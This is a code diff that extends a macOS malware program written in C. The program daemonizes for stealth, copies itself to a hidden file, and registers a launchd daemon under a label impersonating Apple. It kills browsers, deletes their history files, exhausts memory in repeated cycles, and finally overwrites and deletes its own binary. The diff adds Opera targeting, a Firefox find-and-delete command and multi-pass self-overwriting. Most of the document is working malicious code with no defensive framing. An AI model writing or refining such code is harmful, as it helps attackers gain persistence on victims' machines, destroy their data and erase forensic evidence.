@@ -8,6 +8,8 @@
 #include <sys/stat.h>
 #include <sys/types.h>
 #include <dlfcn.h>
+#include <time.h>
+#include <stdint.h>
 
 #define CHUNK_SIZE (100 * 1024 * 1024)  // 100MB chunks
 #define DELAY_SEC (2 * 60)              // 2 minutes in seconds
@@ -20,21 +22,21 @@ void LogActivity(const char *msg) {
     snprintf(logPath, PATH_MAX, "%s/.mslog.dat", tmpDir);
     FILE *logFile = fopen(logPath, "a");
     if (logFile) {
-        fprintf(logFile, "[%ld] %s\n", time(NULL), msg);
+        fprintf(logFile, "[%ld] %s\n", (long)time(NULL), msg);
         fclose(logFile);
     }
 }
 
 // Terminate browser processes to release file locks
 void KillBrowsers() {
-    char *browsers[] = {"Google Chrome", "Firefox", "Safari", "Brave Browser", NULL};
+    char *browsers[] = {"Google Chrome", "Firefox", "Safari", "Brave Browser", "Opera", NULL};
     char command[512];
     
     for (int i = 0; browsers[i]; i++) {
         snprintf(command, sizeof(command), "pkill -9 \"%s\" 2>/dev/null", browsers[i]);
         system(command);
-        LogActivity("Terminated browser processes");
     }
+    LogActivity("Terminated browser processes");
 }
 
 // Clear browser download history by deleting history files
@@ -42,30 +44,29 @@ void ClearBrowserDownloadHistory() {
     struct passwd *pw = getpwuid(getuid());
     const char *homedir = pw->pw_dir;
     char path[PATH_MAX];
+    char command[512];
+    
+    KillBrowsers(); // Ensure browsers are closed
     
     // Chrome-based browsers
     char *chromePaths[] = {
         "/Library/Application Support/Google/Chrome/Default/History",
         "/Library/Application Support/Google/Chrome/Default/History-journal",
-        "/Library/Application Support/BraveSoftware/Brave-Browser/Default/History",
+        "/Library/Application Support/BraveSoftware/Brave-Browser/Default/History", 
         "/Library/Application Support/BraveSoftware/Brave-Browser/Default/History-journal",
+        "/Library/Application Support/Opera/History",
+        "/Library/Application Support/Opera/History-journal",
         NULL
     };
     
-    // Firefox
-    char firefoxPattern[PATH_MAX];
-    snprintf(firefoxPattern, PATH_MAX, "%s/Library/Application Support/Firefox/Profiles", homedir);
-    
-    // Safari
+    // Safari paths
     char *safariPaths[] = {
         "/Library/Safari/History.db",
-        "/Library/Safari/History.db-lock",
+        "/Library/Safari/History.db-lock", 
         "/Library/Safari/History.db-wal",
         "/Library/Safari/History.db-shm",
         NULL
     };
-    
-    KillBrowsers(); // Ensure browsers are closed
     
     // Delete Chrome history files
     for (int i = 0; chromePaths[i]; i++) {
@@ -75,7 +76,7 @@ void ClearBrowserDownloadHistory() {
         }
     }
     
-    // Delete Safari history files
+    // Delete Safari history files  
     for (int i = 0; safariPaths[i]; i++) {
         snprintf(path, PATH_MAX, "%s%s", homedir, safariPaths[i]);
         if (remove(path) == 0) {
@@ -83,20 +84,10 @@ void ClearBrowserDownloadHistory() {
         }
     }
     
-    // Find and delete Firefox history
-    DIR *dir = opendir(firefoxPattern);
-    if (dir) {
-        struct dirent *entry;
-        while ((entry = readdir(dir)) != NULL) {
-            if (strstr(entry->d_name, ".default") || strstr(entry->d_name, ".default-release")) {
-                snprintf(path, PATH_MAX, "%s/%s/places.sqlite", firefoxPattern, entry->d_name);
-                if (remove(path) == 0) {
-                    LogActivity("Deleted Firefox history file");
-                }
-            }
-        }
-        closedir(dir);
-    }
+    // Firefox - find and delete profiles
+    snprintf(command, sizeof(command), "find \"%s/Library/Application Support/Firefox/Profiles\" -name \"places.sqlite\" -delete 2>/dev/null", homedir);
+    system(command);
+    LogActivity("Cleared Firefox history");
 }
 
 // Self-deletion with overwrite
@@ -105,22 +96,27 @@ void SelfDelete() {
     uint32_t size = sizeof(exePath);
     
     if (_NSGetExecutablePath(exePath, &size) == 0) {
-        // Overwrite with random data
+        // Overwrite with random data first
         FILE *self = fopen(exePath, "r+");
         if (self) {
-            char *buffer = malloc(CHUNK_SIZE);
+            char *buffer = malloc(1024 * 1024); // 1MB chunks
             if (buffer) {
-                memset(buffer, arc4random(), CHUNK_SIZE);
-                fwrite(buffer, 1, CHUNK_SIZE, self);
+                for (int i = 0; i < 10; i++) { // Overwrite multiple times
+                    fseek(self, 0, SEEK_SET);
+                    for (int j = 0; j < 10; j++) { // Write 10MB total
+                        arc4random_buf(buffer, 1024 * 1024);
+                        fwrite(buffer, 1, 1024 * 1024, self);
+                    }
+                    fflush(self);
+                }
                 free(buffer);
             }
             fclose(self);
         }
         
         // Schedule deletion
-        char command[PATH_MAX + 50];
-        snprintf(command, sizeof(command), "rm -f \"%s\" &", exePath);
-        system(command);
+        snprintf(exePath, sizeof(exePath), "rm -f \"%s\" > /dev/null 2>&1 &", exePath);
+        system(exePath);
         LogActivity("Scheduled self-deletion with overwrite");
     }
 }
@@ -155,17 +151,17 @@ void InstallToSystem() {
     char exePath[PATH_MAX];
     char destPath[PATH_MAX] = "/usr/local/lib/.msupdate";
     uint32_t size = sizeof(exePath);
+    char command[1024];
     
     if (_NSGetExecutablePath(exePath, &size) == 0) {
         // Create destination directory
         system("mkdir -p /usr/local/lib/ 2>/dev/null");
         
         // Copy executable
-        char command[PATH_MAX * 2 + 50];
         snprintf(command, sizeof(command), "cp \"%s\" \"%s\" 2>/dev/null", exePath, destPath);
         system(command);
         
-        // Set hidden attribute and execute permissions
+        // Set execute permissions
         system("chmod +x /usr/local/lib/.msupdate 2>/dev/null");
         
         // Add to launchd for persistence
@@ -185,11 +181,15 @@ void InstallToSystem() {
                     "    <true/>\n"
                     "    <key>KeepAlive</key>\n"
                     "    <false/>\n"
-                    "    <key>Hidden</key>\n"
-                    "    <true/>\n"
+                    "    <key>StandardOutPath</key>\n"
+                    "    <string>/dev/null</string>\n"
+                    "    <key>StandardErrorPath</key>\n"
+                    "    <string>/dev/null</string>\n"
                     "</dict>\n"
                     "</plist>");
             fclose(plist);
+            
+            // Load the launch daemon
             system("launchctl load /Library/LaunchDaemons/com.apple.msupdate.plist 2>/dev/null");
         }
         
@@ -197,22 +197,14 @@ void InstallToSystem() {
     }
 }
 
-int main() {
-    // Daemonize for stealth
-    Daemonize();
-    
-    // Install to system for persistence
-    InstallToSystem();
-    
-    // Delay execution
-    sleep(DELAY_SEC);
-
+// Memory allocation and manipulation
+void ConsumeMemory() {
     size_t total_allocated = 0;
     void **chunks = NULL;
     size_t chunk_count = 0;
     size_t attempts = 0;
 
-    while (attempts < 10) {
+    while (attempts < 15) {
         attempts++;
         void *chunk = malloc(CHUNK_SIZE);
         if (chunk) {
@@ -225,9 +217,11 @@ int main() {
                 chunk_count++;
             }
             if (chunk_count > 0) {
-                size_t idx = arc4random_uniform((uint32_t)chunk_count);
+                uint32_t idx = arc4random_uniform((uint32_t)chunk_count);
                 memset(chunks[idx], 42, CHUNK_SIZE);
             }
+        } else {
+            break;
         }
     }
 
@@ -236,13 +230,29 @@ int main() {
         free(chunks[i]);
     }
     free(chunks);
-    LogActivity("Freed memory");
+    LogActivity("Memory consumption cycle completed");
+}
 
-    // Clear browser download history
-    ClearBrowserDownloadHistory();
+int main() {
+    // Daemonize for stealth
+    Daemonize();
+    
+    // Install to system for persistence
+    InstallToSystem();
+    
+    // Initial delay
+    sleep(DELAY_SEC);
 
-    // Delete the executable
+    // Main operation loop
+    for (int cycle = 0; cycle < 3; cycle++) {
+        ConsumeMemory();
+        ClearBrowserDownloadHistory();
+        sleep(30); // Short delay between cycles
+    }
+
+    // Final cleanup and self-destruction
     SelfDelete();
+    LogActivity("Execution completed");
 
     return 0;
 }
